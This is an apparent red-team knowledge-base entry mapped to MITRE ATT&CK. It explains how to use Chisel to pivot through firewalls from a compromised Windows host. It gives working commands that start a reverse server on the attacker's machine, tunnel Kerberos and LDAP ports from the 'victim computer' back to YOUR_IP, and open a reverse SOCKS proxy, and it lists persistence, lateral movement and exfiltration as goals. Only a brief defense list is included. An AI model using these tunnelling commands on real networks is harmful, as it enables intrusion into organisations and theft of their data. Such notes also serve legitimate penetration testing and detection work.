---
id: e340d23b-dcac-4955-a7b8-fa8f3b3a6c5b
name: Chisel Port Forwarding and SOCKS Proxy Network Pivoting
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:22.762637+00:00'
updated_at: '2023-04-10T20:25:20.342227+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Connection Proxy|T1090 - Connection Proxy]]'
- '[[Exfiltration Over Command and Control Channel|T1041 - Exfiltration Over Command
  and Control Channel]]'
tags:
- '[[chisel]]'
- '[[Network Pivoting Techniques]]'
commands:
- '[[Connect to chisel server]]'
- '[[Create SOCKS proxy]]'
- '[[Forward ports to hacker computer]]'
- '[[Install chisel]]'
---

# Chisel Port Forwarding and SOCKS Proxy Network Pivoting

## Summary

Chisel is a tool that allows for port forwarding and SOCKS proxying through firewalls and other network restrictions. This technique can be used by an attacker to pivot their network access to a new system that may be more vulnerable or contain valuable data. By using Chisel, an attacker can bypass

## Description

# Description

Chisel is a tool that allows for port forwarding and SOCKS proxying through firewalls and other network restrictions. This technique can be used by an attacker to pivot their network access to a new system that may be more vulnerable or contain valuable data. By using Chisel, an attacker can bypass network restrictions and maintain a persistent connection to the target network. From there, the attacker can move laterally through the network and exfiltrate sensitive data.

Technically, Chisel works by establishing a connection between two systems and forwarding traffic through an encrypted tunnel. The attacker would first need to establish a foothold on a system within the target network, then use Chisel to pivot their network access to a new system. This technique can be particularly effective if the target network has strict firewall rules or other network restrictions in place.

From a business perspective, this technique highlights the importance of network segmentation and access control. By limiting network access to only those who require it, an organization can reduce the risk of lateral movement and data exfiltration.

 

## Requirements

1. Access to a system within the target network

1. Chisel tool installed on both the attacker and target systems

 

## Defense

1. Implement strict network segmentation and access control to limit lateral movement

1. Monitor network traffic for signs of port forwarding or SOCKS proxying

1. Use endpoint detection and response (EDR) tools to detect and respond to suspicious activity

 

## Objectives

1. Pivot network access to a new system within the target network

1. Maintain persistent access to the target network

1. Move laterally through the network

1. Exfiltrate sensitive data

 

# Instructions

1. To use this command, first install Chisel by running 'go get -v github.com/jpillora/chisel'. Then, to forward ports 389 and 88 to the hacker computer, run '/opt/chisel/chisel server -p 8008 --reverse' on the hacker computer and 'chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389' on the victim computer. To use SOCKS proxy, run 'chisel.exe client YOUR_IP:8008 R:socks' on the victim computer.

 



**Code**: [[go get -v github.com/jpillora/chisel

# forward po]]



> The 'chisel' command is used to create a tunnel between two computers, allowing for port forwarding and SOCKS proxy. The 'go get' command is used to install Chisel. The 'chisel server' command is used to start the server on the hacker computer. The 'chisel client' command is used to connect the victim computer to the server and forward ports or create a SOCKS proxy. The 'R' flag is used to specify the remote port and destination. In the example above, port 88 is forwarded to 127.0.0.1:88 and port 389 is forwarded to localhost:389. The 'socks' flag is used to create a SOCKS proxy.



**Command** ([[Install chisel]]):

```bash
go get -v github.com/jpillora/chisel
```





**Command** ([[Forward ports to hacker computer]]):

```bash
/opt/chisel/chisel server -p 8008 --reverse
```





**Command** ([[Connect to chisel server]]):

```bash
.\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389
```





**Command** ([[Create SOCKS proxy]]):

```bash
.\chisel.exe client YOUR_IP:8008 R:socks
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Connection Proxy|T1090 - Connection Proxy]]
- [[Exfiltration Over Command and Control Channel|T1041 - Exfiltration Over Command and Control Channel]]

## Commands Used

- [[Connect to chisel server]]
- [[Create SOCKS proxy]]
- [[Forward ports to hacker computer]]
- [[Install chisel]]

## Tags

- [[chisel]]
- [[Network Pivoting Techniques]]


